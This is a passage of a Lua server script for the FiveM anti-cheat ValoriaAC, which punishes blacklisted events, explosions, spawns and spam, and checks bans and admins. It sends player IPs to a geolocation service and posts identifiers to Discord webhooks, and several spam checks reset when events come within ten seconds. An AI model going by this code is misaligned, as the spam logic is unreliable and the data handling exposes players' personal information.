            }
        end
    end
end)
local a = "\112"
-- Add event handlers for blacklisted triggers
if ValoriaAC.AntiBlackListTrigger then
    for i = 1, #Events do
        RegisterNetEvent(Events[i])
        AddEventHandler(Events[i], function()
            local SRC = source
            local ENAME = Events[i]
            ValoriaAC_ACTION(SRC, ValoriaAC.TriggerPunishment, "Anti Black List Trigger",
                "Try For Run Black List Trigger : " .. ENAME .. "")
            CancelEvent()
        end)
    end
end

-- Add event handler for database updates to prevent unauthorized changes
AddEventHandler("db:updateUser", function(data)
    local SRC = source
    if ValoriaAC.AntiChangePerm then
        if not data.playerName or not data.dateofbirth then
            ValoriaAC_ACTION(SRC, ValoriaAC.PermPunishment, "Anti Change Perm",
                "Try Change Perm, Data = `" .. json.encode(data) .. "`")
            CancelEvent()
        end
    end
end)

-- Add event handler for monitoring explosions
local EXPLOSION = {} -- Table to store explosion data
AddEventHandler("explosionEvent", function(SRC, DATA)
    if tonumber(SRC) then
        local HWID = GetPlayerToken(SRC, 0)
        if DATA ~= nil then
            --【 𝗕𝗹𝗮𝗰𝗸 𝗟𝗶𝘀𝘁 𝗠𝗮𝗻𝗮𝗴𝗲 】--
            local TABLE = Explosion[DATA.explosionType]
            if TABLE ~= nil then
                local NAME = TABLE.NAME
                if TABLE.Log then
                    ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Exoplosion, "EXPLOSION", NAME)
                end
                if TABLE.Punishment ~= nil and TABLE.Punishment ~= false then
                    if TABLE.Punishment == "WARN" then
                        ValoriaAC_ACTION(SRC, TABLE.Punishment, "Anti Explosion",
                            "Try For Create Black List Explosion : **" .. NAME .. "**")
                        CancelEvent()
                    elseif TABLE.Punishment == "KICK" then
                        ValoriaAC_ACTION(SRC, TABLE.Punishment, "Anti Explosion",
                            "Try For Create Black List Explosion : **" .. NAME .. "**")
                        CancelEvent()
                    elseif TABLE.Punishment == "BAN" then
                        ValoriaAC_ACTION(SRC, TABLE.Punishment, "Anti Explosion",
                            "Try For Create Black List Explosion : **" .. NAME .. "**")
                        CancelEvent()
                    end
                end
            end
            --【 𝗦𝗽𝗮𝗺 𝗖𝗵𝗲𝗰𝗸 】--
            if ValoriaAC.AntiExplosionSpam then
                if EXPLOSION[HWID] ~= nil then
                    EXPLOSION[HWID].COUNT = EXPLOSION[HWID].COUNT + 1
                    if os.time() - EXPLOSION[HWID].TIME <= 10 then
                        EXPLOSION[HWID] = nil
                    else
                        if EXPLOSION[HWID].COUNT >= ValoriaAC.MaxExplosion then
                            ValoriaAC_ACTION(SRC, ValoriaAC.ExplosionSpamPunishment, "Anti Spam Explosion",
                                "Try For Spam Explosion Type: " ..
                                DATA.explosionType .. " for " .. EXPLOSION[HWID].COUNT .. " times.")
                            CancelEvent()
                        end
                    end
                else
                    EXPLOSION[HWID

                    ] = {
                        COUNT = 1,
                        TIME  = os.time()
                    }
                end
            end
        else
            CancelEvent()
        end
    else
        CancelEvent()
    end
end)

-- Add event handler for preventing certain sounds from playing
if GetResourceState("interact-sound") == "started" then
    AddEventHandler("InteractSound_SV:PlayWithinDistance", function(maxDistance, soundFile, soundVolume)
        local SRC = source
        if ValoriaAC.AntiPlaySound then
            if maxDistance == 10000 and soundFile == "handcuff" then
                ValoriaAC_ACTION(SRC, ValoriaAC.SoundPunishment, "Anti Play Sound",
                    "Try For Play **handcuff** sound in **" .. maxDistance .. "** Distance")
                CancelEvent()
            elseif maxDistance == 1000 and soundFile == "Cuff" then
                ValoriaAC_ACTION(SRC, ValoriaAC.SoundPunishment, "Anti Play Sound",
                    "Try For Play **Cuff** sound in **" .. maxDistance .. "** Distance")
                CancelEvent()
            elseif maxDistance == 103232 and soundFile == "lock" then
                ValoriaAC_ACTION(SRC, ValoriaAC.SoundPunishment, "Anti Play Sound",
                    "Try For Play **Lock** sound in **" .. maxDistance .. "** Distance")
                CancelEvent()
            elseif maxDistance == 10 and soundFile == "szajbusek" then
                ValoriaAC_ACTION(SRC, ValoriaAC.SoundPunishment, "Anti Play Sound",
                    "Try For Play **szajbusek** sound in **" .. maxDistance .. "** Distance")
                CancelEvent()
            elseif maxDistance == 5 and soundFile == "alarm" then
                ValoriaAC_ACTION(SRC, ValoriaAC.SoundPunishmentt, "Anti Play Sound",
                    "Try For Play **alarm** sound in **" .. maxDistance .. "** Distance")
                CancelEvent()
            elseif maxDistance == 13232 and soundFile == "pasysound" then
                ValoriaAC_ACTION(SRC, ValoriaAC.SoundPunishment, "Anti Play Sound",
                    "Try For Play **pasysound** sound in **" .. maxDistance .. "** Distance")
                CancelEvent()
            elseif maxDistance == 5000 and soundFile == "demo" then
                ValoriaAC_ACTION(SRC, ValoriaAC.SoundPunishment, "Anti Play Sound",
                    "Try For Play **pasysound** sound in **" .. maxDistance .. "** Distance")
                CancelEvent()
            end
        end
    end)
end

-- Add event handler for preventing tazer spam
local TAZE = {}
AddEventHandler("weaponDamageEvent", function(SRC, DATA)
    if ValoriaAC.AntiTazePlayers then
        local HWID = GetPlayerToken(SRC, 0)
        if DATA.weaponType == 911657153 then
            if TAZE[HWID] ~= nil then
                TAZE[HWID].COUNT = TAZE[HWID].COUNT + 1
                if os.time() - TAZE[HWID].TIME <= 10 then
                    TAZE[HWID] = nil
                else
                    if TAZE[HWID].COUNT >= ValoriaAC.MaxTazeSpam then
                        ValoriaAC_ACTION(SRC, ValoriaAC.TazePunishment, "Anti Spam Tazer",
                            "Try For Spam Tazer for **" .. TAZE[HWID].COUNT .. "** times.")
                        CancelEvent()
                    end
                end
            else
                TAZE[HWID] = {
                    COUNT = 1,
                    TIME  = os.time()
                }
            end
        end
    end
end)

-- Table to store data for preventing clearPedTasks abuse
local FREEZE = {}

-- Event handler for clearPedTasksEvent
AddEventHandler("clearPedTasksEvent", function(SRC, DATA)
    local HWID = GetPlayerToken(SRC, 0)

    if ValoriaAC.AntiClearPedTasks then
        -- Check if player is in the FREEZE table
        if FREEZE[HWID] ~= nil then
            -- Increase the count of clearPedTasks events
            FREEZE[HWID].COUNT = FREEZE[HWID].COUNT + 1

            -- Check if the time elapsed since the first clearPedTasks event is less than or equal to 10 seconds
            if os.time() - FREEZE[HWID].TIME <= 10 then
                FREEZE[HWID] = nil
            else
                -- Check if the count exceeds the maximum allowed clearPedTasks events
                if FREEZE[HWID].COUNT >= ValoriaAC.MaxClearPedTasks then
                    ValoriaAC_ACTION(SRC, ValoriaAC.CPTPunishment, "Anti Clear Ped Tasks",
                        "Try Clear Ped Tasks for " .. FREEZE[HWID].TIME .. ".")
                    CancelEvent()
                end
            end
        else
            -- If player is not in the FREEZE table, add them with initial data
            FREEZE[HWID] = {
                COUNT = 1,
                TIME  = os.time()
            }
        end
    end
end)

-- Event handler for syncing dead bodies in ambulance job
RegisterNetEvent("esx_ambulancejob:syncDeadBody")
AddEventHandler("esx_ambulancejob:syncDeadBody", function(PED, TARGET)
    local SRC = source
    if ValoriaAC.AntiBringAll then
        ValoriaAC_ACTION(SRC, ValoriaAC.BringAllPunishment, "Anti Bring All Players", "Try For Bring All Players")
        CancelEvent()
    end
end)

-- Event handlers for refreshing commands on resource starting and stopping
AddEventHandler("onResourceStarting", function(RES)
    ValoriaAC_REFRESHCMD()
end)

AddEventHandler("onResourceStop", function(RES)
    ValoriaAC_REFRESHCMD()
end)

-- Event handlers for player connection
AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
    local SRC = source
    local IP = GetPlayerEndpoint(SRC)
    local STEAM, DISCORD, FIVEML, LIVE, XBL = "Not Found", "Not Found", "Not Found", "Not Found", "Not Found"
    local ISP, CITY, COUNTRY, PROXY, HOSTING, LON, LAT = "Not Found", "Not Found", "Not Found", "Not Found", "Not Found",
        "Not Found", "Not Found"
    local HWID = GetPlayerToken(SRC, 0)

    -- Process IP address
    IP = (string.gsub(string.gsub(string.gsub(IP, "-", ""), ",", ""), " ", ""):lower())
    local g, f = IP:find(string.lower("192.168"))
    if g or f then
        IP = "178.131.122.181"
    end

    -- Extract player identifiers
    for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
        if DATA:match("steam") then
            STEAM = DATA
        elseif DATA:match("discord") then
            DISCORD = DATA:gsub("discord:", "")
        elseif DATA:match("license") then
            FIVEML = DATA
        elseif DATA:match("live") then
            LIVE = DATA
        elseif DATA:match("xbl") then
            XBL = DATA
        end
    end

    print("^" .. COLORS .. "ValoriaAC^0: ^2Player ^3" .. name .. " ^2Connecting ...^0")
    deferrals.defer()

    -- Check if player is in ban list
    local isInBanList = ValoriaAC_INBANLIST(SRC)
    if isInBanList then
        local card = {
            type = "AdaptiveCard",
            version = "1.2",
            body = {
                -- Add the logo at the top
                {
                    type = "Image",
                    url = "https://e.top4top.io/p_3206h0i511.png",
                    size = "Medium",
                    horizontalAlignment = "Center",
                    altText = "ValoriaAC Logo"
                },
                {
                    type = "TextBlock",
                    text = "You have been banned by Valoria Anticheat",
                    wrap = true,
                    horizontalAlignment = "Center",
                    separator = true,
                    height = "stretch",
                    fontType = "Default",
                    size = "Large",
                    weight = "Bolder",
                    color = "Orange"
                },
                {
                    type = "TextBlock",
                    text = "Ban Information :\nReason: " .. isInBanList[1].REASON .. "\nBan ID: #" .. isInBanList[1].BANID,
                    wrap = true,
                    horizontalAlignment = "Center",
                    separator = true,
                    height = "stretch",
                    fontType = "Default",
                    size = "Medium",
                    weight = "Bolder",
                    color = "Light"
                },
                {
                    type = "ColumnSet",
                    horizontalAlignment = "Center", -- Centers the entire ColumnSet
                    columns = {
                        {
                            type = "Column",
                            width = "auto",
                            horizontalAlignment = "Center", -- Center the first button
                            items = {
                                {
                                    type = "ActionSet",
                                    actions = {
                                        {
                                            type = "Action.OpenUrl",
                                            title = "Join Discord",
                                            url = "https://discord.gg/8EqMRWcaA9",
                                            iconUrl = "https://icons.getbootstrap.com/assets/icons/discord.svg"
                                        }
                                    }
                                }
                            }
                        },
                        {
                            type = "Column",
                            width = "auto",
                            horizontalAlignment = "Center", -- Center the second button
                            separator = true,
                            spacing = "Medium",
                            items = {
                                {
                                    type = "ActionSet",
                                    actions = {
                                        {
                                            type = "Action.OpenUrl",
                                            title = "Visit our website",
                                            url = "https://instagram.com/xmodz.yt",
                                            iconUrl = "https://icons.getbootstrap.com/assets/icons/globe.svg"
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                {
                    type = "TextBlock",
                    text = "This server is protected by ValoriaAC®",
                    wrap = true,
                    horizontalAlignment = "Center",
                    separator = true,
                    height = "stretch",
                    fontType = "Default",
                    size = "Small",
                    weight = "Bolder",
                    color = "Light"
                }
            }
        }

        print("^" ..
            COLORS ..
            "ValoriaAC^0: ^1Player ^3" ..
            GetPlayerName(SRC) .. " ^3Try For Join But ^0| ^3Ban ID: ^3 " .. isInBanList[1].BANID .. "^0")
        ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Connect, "TFJ", isInBanList[1].BANID, isInBanList[1].REASON)

        while true do
            Wait(0)
            deferrals.presentCard(card, "XD")
        end
    end

    -- Check if player's name is in the blacklist
    if ValoriaAC.Connection.AntiBlackListName then
        name = (string.gsub(string.gsub(string.gsub(name, "-", ""), ",", ""), " ", ""):lower())
        for index, value in ipairs(Names) do
            local g, f = name:find(string.lower(value))
            if g or f then
                print("^" ..
                    COLORS ..
                    "ValoriaAC^0: ^1Player ^3" ..
                    name .. " ^3Try For Join ^0| ^3Black List Word in name: ^3 " .. value .. "^0")
                ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Connect, "BLN", "Black List Name",
                    "We are Found " .. value .. " in the name off this player")
                deferrals.done("\n[" ..
                    Emoji.Fire ..
                    "ValoriaAC" ..
                    Emoji.Fire ..
                    "]\nYou Can not Join Server:\n We Are Find (" ..
                    value .. ") in your Name Please Remove That Or Change Your Name ☺️")
            end
        end
    end

    -- Check for VPN usage
    if ValoriaAC.Connection.AntiVPN and not ValoriaAC.ServerConfig.Linux then
        PerformHttpRequest("http://ip-api.com/json/" .. IP .. "?fields=66846719", function(ERROR, DATA, RESULT)
            if DATA then
                local TABLE = json.decode(DATA)
                if TABLE then
                    ISP, CITY, COUNTRY = TABLE["isp"], TABLE["city"], TABLE["country"]
                    PROXY, HOSTING, LON, LAT = TABLE["proxy"] and "ON" or "OFF", TABLE["hosting"] and "ON" or "OFF",
                        TABLE["lon"], TABLE["lat"]

                    if PROXY == "ON" or HOSTING == "ON" then
                        if ValoriaAC.Connection.HideIP then IP = "* HIDE BY OWNER *" end
                        local card = {
                            type = "AdaptiveCard",
                            version = "1.2",
                            body = {
                                { type = "Image",     url = "https://cache.ip-api.com/" .. LON .. "," .. LAT .. ",10",                                                                                                                       horizontalAlignment = "Center" },
                                {
                                    type = "TextBlock",

                                    text = "ValoriaAC",
                                    wrap = true,
                                    horizontalAlignment = "Center",
                                    separator = true,
                                    height = "stretch",
                                    fontType = "Default",
                                    size = "Large",
                                    weight = "Bolder",
                                    color = "Light"
                                },
                                { type = "TextBlock", text = "Your VPN is on Plase Turn off that\nIP: " .. IP .. "\nVPN: " .. PROXY .. "\nHosting: " .. HOSTING .. "\nISP: " .. ISP .. "\nCountry: " .. COUNTRY .. "\nCity: " .. CITY .. "", wrap = true,                   horizontalAlignment = "Center", separator = true, height = "stretch", fontType = "Default", size = "Medium", weight = "Bolder", color = "Light" },
                            }
                        }

                        print("^" ..
                            COLORS ..
                            "ValoriaAC^0: ^1Player ^3" ..
                            GetPlayerName(SRC) ..
                            " ^3Try For Join ^0| ^3VPN Availble ^3 ISP: " ..
                            ISP .. "/ Country:" .. COUNTRY .. "/ City: " .. CITY .. "^0")
                        ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Connect, "VPN")
                        deferrals.presentCard(card, "XD")
                        Wait(15000)
                        deferrals.done("[" ..
                            Emoji.Fire .. "ValoriaAC" .. Emoji.Fire .. "]\nPlease Turn off your vpn and rejoin !")
                    else
                        local NEW_HWID = GetPlayerToken(SRC, 0)
                        if NEW_HWID then
                            if ValoriaAC.Connection.HideIP then IP = "* HIDE BY OWNER *" end
                            ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Connect, "CONNECT")
                            deferrals.update("\n[" ..
                                Emoji.Fire ..
                                "ValoriaAC" ..
                                Emoji.Fire ..
                                "] Your Information\nName: " ..
                                name ..
                                "\nLicense : " ..
                                FIVEML ..
                                "\nSteam : " ..
                                STEAM ..
                                "\nDiscord ID: " ..
                                DISCORD ..
                                "\nLive ID: " ..
                                LIVE .. "\nXbox ID: " .. XBL .. "\nIP: " .. IP .. "\nHWID : " .. NEW_HWID .. "")
                            Wait(2000)
                            deferrals.done()
                        else
                            deferrals.done("[" ..
                                Emoji.Fire ..
                                "ValoriaAC" ..
                                Emoji.Fire .. "]\nYour HWID (FiveM Token) not found. Please restart your FiveM client!")
                        end
                    end
                else
                    ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "playerConnecting (TABLE Not Found)")
                end
            else
                ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "playerConnecting (DATA Not Found)")
            end
        end)
    else
        ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Connect, "CONNECT")
        deferrals.update("\n[" ..
            Emoji.Fire ..
            "ValoriaAC" ..
            Emoji.Fire ..
            "] Your Information\nName: " ..
            name ..
            "\nLicense : " ..
            FIVEML ..
            "\nSteam : " ..
            STEAM ..
            "\nDiscord ID: " ..
            DISCORD .. "\nLive ID: " .. LIVE .. "\nXbox ID: " .. XBL .. "\nIP: " .. IP .. "\nHWID : " .. HWID .. "")
        Wait(2000)
        deferrals.done()
    end
end)

-- This code is an anti-cheat script for FiveM designed to prevent players from spawning unauthorized objects, peds, and vehicles.

-- Define variables to store information about entities (vehicles, peds, objects)
local SV_VEHICLES, SV_PEDS, SV_OBJECT = {}, {}, {}

-- Event Handler for when an entity is created
AddEventHandler("entityCreated", function(ENTITY)
    if DoesEntityExist(ENTITY) then
        local OWNER = NetworkGetFirstEntityOwner(ENTITY)
        local TYPE, POPULATION, MODEL, HWID = GetEntityType(ENTITY), GetEntityPopulationType(ENTITY),
            GetEntityModel(ENTITY), GetPlayerToken(OWNER, 0)

        -- Execute actions based on anti-cheat settings
        -- Anti-Blacklist Object Management
        if ValoriaAC.AntiBlackListObject and TYPE == 3 and POPULATION == 0 then
            for _, value in ipairs(Objects) do
                if MODEL == GetHashKey(value) then
                    if DoesEntityExist(ENTITY) then
                        DeleteEntity(ENTITY)
                        Wait(1000)
                        ValoriaAC_ACTION(OWNER, ValoriaAC.EntityPunishment, "Anti Spawn Object", "Try For Spawn Object")
                    end
                end
            end
        end

        -- Anti-Blacklist Ped Management
        if ValoriaAC.AntiBlackListPed and TYPE == 1 and POPULATION == 0 then
            for _, value in ipairs(Peds) do
                if MODEL == GetHashKey(value) then
                    if DoesEntityExist(ENTITY) then
                        DeleteEntity(ENTITY)
                        Wait(1000)
                        ValoriaAC_ACTION(OWNER, ValoriaAC.EntityPunishment, "Anti Spawn Ped", "Try For Spawn Ped")
                    end
                end
            end
        end

        -- Anti-Blacklist Vehicle Management
        if ValoriaAC.AntiBlackListVehicle and TYPE == 2 and POPULATION == 0 then
            for _, value in ipairs(Vehicle) do
                if MODEL == GetHashKey(value) then
                    if DoesEntityExist(ENTITY) then
                        DeleteEntity(ENTITY)
                        Wait(1000)
                        ValoriaAC_ACTION(OWNER, ValoriaAC.EntityPunishment, "Anti Spawn Vehicle", "Try For Spawn Vehicle")
                    end
                end
            end
        end

        -- Spam Management
        if POPULATION == 0 then
            local spamTable = TYPE == 2 and SV_VEHICLES or (TYPE == 1 and SV_PEDS or (TYPE == 3 and SV_OBJECT or nil))

            if spamTable then
                if HWID then
                    if spamTable[HWID] then
                        spamTable[HWID].COUNT = spamTable[HWID].COUNT + 1
    
                        if os.time() - spamTable[HWID].TIME >= 10 then
                            spamTable[HWID] = nil
                        else
                            local entityType = TYPE == 2 and "Vehicle" or
                                (TYPE == 1 and "Ped" or (TYPE == 3 and "Object" or nil))
    
                            if spamTable[HWID].COUNT >= ValoriaAC["Max" .. entityType] then
                                local entityList = GetAllEntitiesOfType(TYPE)
    
                                for _, entity in ipairs(entityList) do
                                    local entityOwner = NetworkGetFirstEntityOwner(entity)
    
                                    if entityOwner == OWNER and DoesEntityExist(entity) then
                                        DeleteEntity(entity)
                                    end
                                end
    
                                ValoriaAC_ACTION(OWNER, ValoriaAC.SpamPunishment, "Anti Spam " .. entityType,
                                    "Try For Spam " .. spamTable[HWID].COUNT)
                            end
                        end
                    else
                        spamTable[HWID] = { COUNT = 1, TIME = os.time() }
                    end
                else
                    print("^" .. COLORS .. "[ValoriaAC]^0: ^1 This player ("..OWNER..") HWID (FiveM Token) not found !^0")
                end
            end
        end
    end
end)

-- This function initiates the anti-cheat system and loads required configuration files.

function StartAntiCheat()
    -- List of resource files to be loaded
    local resources = {
        "configs/valoria-config.lua",
        "tables/valoria-event.lua",
        "tables/valoria-explosions.lua",
        "tables/valoria-name.lua",
        "tables/valoria-object.lua",
        "tables/valoria-peds.lua",
        "tables/valoria-plate.lua",
        "tables/valoria-vehicle.lua",
        "tables/valoria-weapon.lua",
        "tables/valoria-words.lua",
        "tables/valoria-task.lua",
        "tables/valoria-anim.lua",
        "tables/valoria-emoji.lua",
    }

    local loadedFiles = {} -- Tracks successfully loaded files

    -- Load each resource file
    for _, resource in ipairs(resources) do
        local content = LoadResourceFile(GetCurrentResourceName(), resource)
        if content then
            table.insert(loadedFiles, resource)
            print("^" .. COLORS .. "[ValoriaAC]^0: ^2" .. resource .. " LOADED !^0")
        end
    end

    -- Check if all required files are loaded successfully
    if #loadedFiles == #resources then
        -- Display a header for the anti-cheat system
        print("^" .. COLORS .. "")
        print([[
    
^1$$\    $$\          $$\                     $$\            $$$$$$\   $$$$$$\  
^1$$ |   $$ |         $$ |                    \__|          $$  __$$\ $$  __$$\ 
^1$$ |   $$ |$$$$$$\  $$ | $$$$$$\   $$$$$$\  $$\  $$$$$$\  $$ /  $$ |$$ /  \__|
^1\$$\  $$  |\____$$\ $$ |$$  __$$\ $$  __$$\ $$ | \____$$\ $$$$$$$$ |$$ |      
^1 \$$\$$  / $$$$$$$ |$$ |$$ /  $$ |$$ |  \__|$$ | $$$$$$$ |$$  __$$ |$$ |      
^1  \$$$  / $$  __$$ |$$ |$$ |  $$ |$$ |      $$ |$$  __$$ |$$ |  $$ |$$ |  $$\ 
^1   \$  /  \$$$$$$$ |$$ |\$$$$$$  |$$ |      $$ |\$$$$$$$ |$$ |  $$ |\$$$$$$  |
^1    \_/    \_______|\__| \______/ \__|      \__| \_______|\__|  \__| \______/ 
                                                                              
                ^2 Made by Xmodz & #4rchan                                                              
                                                                              

                    ]])

        -- Perform an HTTP request to get server information
        PerformHttpRequest("http://localhost:" .. ValoriaAC.ServerConfig.Port .. "/info.json", function(ERROR, DATA, RESULT)
            if DATA ~= nil then
                -- Extract server build information
                local ARTIFACT = string.gsub(
                    string.gsub(
                        string.gsub(string.gsub(string.gsub(json.decode(DATA).server, "FXServer", " "), "-master", " "),
                            " SERVER", " "), "v1.0.0.", " "), "win32", "")
                print("^" .. COLORS .. "[ValoriaAC]^0: ^3Server Build : " .. ARTIFACT .. "")

                -- Send an embed message to the designated webhook
                PerformHttpRequest(ValoriaAC.Webhooks.Ban, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url = "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url = "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "ValoriaAC " .. ValoriaAC.Version .. "",
                            description = "**Current Version:** " ..
                                ValoriaAC.Version ..
                                "\n**License:** " ..
                                ValoriaAC.ServerConfig.Name ..
                                "\n**Server Build:** " .. ARTIFACT .. "\nStarted successfully...",
                            color = math.random(0, 16776960)
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            else
                -- Display an error message if the server information request fails
                ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name,
                    "function StartAntiCheat (Server Port is wrong or We can't connect to that)")
            end
        end)
    else
        -- Display an error message if not all required files are found
        print("^" .. COLORS .. "[ValoriaAC]^0: ^1 Some Files Of ValoriaAC Not Found! Please Replace or Repair Them^0")
        for i = 1, 6 do
            Wait(1000)
            print("^" .. COLORS .. "[ValoriaAC]^0: ^1 Some Files Of ValoriaAC Not Found! Please Replace or Repair Them^0")
        end
    end
end

-- Check if the player is near any admin
function ValoriaAC_ISNEARADMIN(SRC)
    if tonumber(SRC) ~= nil then
        local RESULT = false
        local P_DATA = GetPlayers()
        local MY_PED = GetPlayerPed(SRC)
        local MY_POS = GetEntityCoords(MY_PED)

        -- Iterate through active players
        for index, value in ipairs(P_DATA) do
            local IS_ADMIN = ValoriaAC_GETADMINS(value)
            if IS_ADMIN then
                local ADMIN_PED = GetPlayerPed(value)
                local ADMIN_POS = GetEntityCoords(ADMIN_PED)

                -- Check if the player is within a 30 unit radius of any admin
                if #(MY_POS - ADMIN_POS) < 30 then
                    RESULT = true
                else
                    RESULT = false
                end
            end
        end
        return RESULT
    else
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "function ValoriaAC_WHITELIST (SRC Not Found)")
    end
end

-- Check if the player is whitelisted
function ValoriaAC_WHITELIST(SRC)
    if tonumber(SRC) ~= nil then
        if ValoriaAC.ACE.Enable == false then
            local IS_WHITELIST = false
            local STEAM = "Not Found"
            local DISCORD = "Not Found"
            local FIVEML = "Not Found"
            local LIVE = "Not Found"
            local XBL = "Not Found"
            local IP = GetPlayerEndpoint(SRC)

            -- Extract player identifiers
            for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
                if DATA:match("steam") then
                    STEAM = DATA
                elseif DATA:match("discord") then
                    DISCORD = DATA:gsub("discord:", "")
                elseif DATA:match("license") then
                    FIVEML = DATA
                elseif DATA:match("live") then
                    LIVE = DATA
                elseif DATA:match("xbl") then
                    XBL = DATA
                end
            end

            local p = promise.new()

            -- Query the database to check if the player is whitelisted
            MySQL.Async.fetchAll(
                'SELECT * FROM valoriaac_whitelist WHERE identifier IN (@steam, @discord, @fivem, @live, @xbl)', {
                    ['@steam'] = STEAM,
                    ['@discord'] = DISCORD,
                    ['@fivem'] = FIVEML,
                    ['@live'] = LIVE,
                    ['@xbl'] = XBL
                }, function(users)
                    if users and next(users) ~= nil then
                        IS_WHITELIST = true
                    end
                    p:resolve(IS_WHITELIST)
                end)

            return Citizen.Await(p)
        elseif ValoriaAC.ACE.Enable == true then
            return IsPlayerAceAllowed(SRC, ValoriaAC.ACE.Whitelist)
        else
            ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "Config: ValoriaAC.ACE.Enable is not true or false")
        end
    else
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "function ValoriaAC_WHITELIST (SRC Not Found)")
    end
end

-- Check if the player is an admin
function ValoriaAC_GETADMINS(SRC)
    if tonumber(SRC) ~= nil then
        if ValoriaAC.ACE.Enable == false then
            local ISADMIN = false
            local STEAM = "Not Found"
            local DISCORD = "Not Found"
            local FIVEML = "Not Found"
            local LIVE = "Not Found"
            local XBL = "Not Found"
            local IP = GetPlayerEndpoint(SRC)

            -- Extract player identifiers
            for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
                if DATA:match("steam") then
                    STEAM = DATA
                elseif DATA:match("discord") then
                    DISCORD = DATA:gsub("discord:", "")
                elseif DATA:match("license") then
                    FIVEML = DATA
                elseif DATA:match("live") then
                    LIVE = DATA
                elseif DATA:match("xbl") then
                    XBL = DATA
                end
            end

            local p = promise.new()

            -- Query the database to check if the player is an admin
            MySQL.Async.fetchAll(
                'SELECT * FROM valoriaac_admin WHERE identifier IN (@steam, @discord, @fivem, @live, @xbl)', {
                    ['@steam'] = STEAM,
                    ['@discord'] = DISCORD,
                    ['@fivem'] = FIVEML,
                    ['@live'] = LIVE,
                    ['@xbl'] = XBL
                }, function(users)
                    if users and next(users) ~= nil then
                        ISADMIN = true
                    end
                    p:resolve(ISADMIN)
                end)

            return Citizen.Await(p)
        elseif ValoriaAC.ACE.Enable == true then
            return IsPlayerAceAllowed(SRC, ValoriaAC.ACE.Admin)
        else
            ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "Config: ValoriaAC.ACE.Enable is not true or false")
        end
    else
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "function ValoriaAC_GETADMINS (SRC Not Found)")
    end
end

-- Check if the player is unbanned
function ValoriaAC_UNBANACCESS(SRC)
    if tonumber(SRC) ~= nil then
        if ValoriaAC.ACE.Enable == false then
            local ISADMIN = false
            local STEAM = "Not Found"
            local DISCORD = "Not Found"
            local FIVEML = "Not Found"
            local LIVE = "Not Found"
            local XBL = "Not Found"
            local IP = GetPlayerEndpoint(SRC)

            -- Extract player identifiers
            for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
                if DATA:match("steam") then
                    STEAM = DATA
                elseif DATA:match("discord") then
                    DISCORD = DATA:gsub("discord:", "")
                elseif DATA:match("license") then
                    FIVEML = DATA
                elseif DATA:match("live") then
                    LIVE = DATA
                elseif DATA:match("xbl") then
                    XBL = DATA
                end
            end

            local p = promise.new()

            -- Query the database to check if the player is unbanned
            MySQL.Async.fetchAll(
                'SELECT * FROM valoriaac_unban WHERE identifier IN (@steam, @discord, @fivem, @live, @xbl)', {
                    ['@steam'] = STEAM,
                    ['@discord'] = DISCORD,
                    ['@fivem'] = FIVEML,
                    ['@live'] = LIVE,
                    ['@xbl'] = XBL
                }, function(users)
                    if users and next(users) ~= nil then
                        ISADMIN = true
                    end
                    p:resolve(ISADMIN)
                end)

            return Citizen.Await(p)
        elseif ValoriaAC.ACE.Enable == true then
            return IsPlayerAceAllowed(SRC, ValoriaAC.ACE.Unban)
        else
            ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "Config: ValoriaAC.ACE.Enable is not true or false")
        end
    else
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "function ValoriaAC_UNBANACCESS (SRC Not Found)")
    end
end

-- Log errors to Discord
function ValoriaAC_ERROR(SERVER_NAME, ERROR)
    if SERVER_NAME ~= nil then
        if ERROR ~= nil then
            PerformHttpRequest(ValoriaAC.Webhooks.Error, function(ERROR, DATA, RESULT)
            end, "POST", json.encode({
                embeds = {
                    {
                        author = {
                            name = "Valoria Anticheat",
                            url = "https://discord.gg/drwWFkfu6x",
                            icon_url = "https://e.top4top.io/p_3206h0i511.png"
                        },
                        footer = {
                            text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                            icon_url = "https://e.top4top.io/p_3206h0i511.png",
                        },
                        title = "" .. Emoji.Warn .. " Warning " .. Emoji.Warn .. "",
                        description = "**Error**: `" .. ERROR .. "`\n**License:** " .. SERVER_NAME .. "",
                        color = 1769216
                    }
                }
            }), {
                ["Content-Type"] = "application/json"
            })
        else
            ValoriaAC_ERROR(SERVER_NAME, "function ValoriaAC_ERROR (ERROR Not Found)")
        end
    else
        ValoriaAC_ERROR(SERVER_NAME, "function ValoriaAC_ERROR (SERVER_NAME Not Found)")
    end
end

-- Ban a player with reason
function ValoriaAC_BAN(SRC, REASON)
    if tonumber(SRC) and tostring(REASON) then
        local STEAM = "N/A"
        local DISCORD = "N/A"
        local FIVEML = "N/A"
        local LIVE = "N/A"
        local XBL = "N/A"
        local IP = GetPlayerEndpoint(SRC)
        local TOKENS = {}

        -- Extract player identifiers
        for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
            if DATA:match("steam") then
                STEAM = DATA
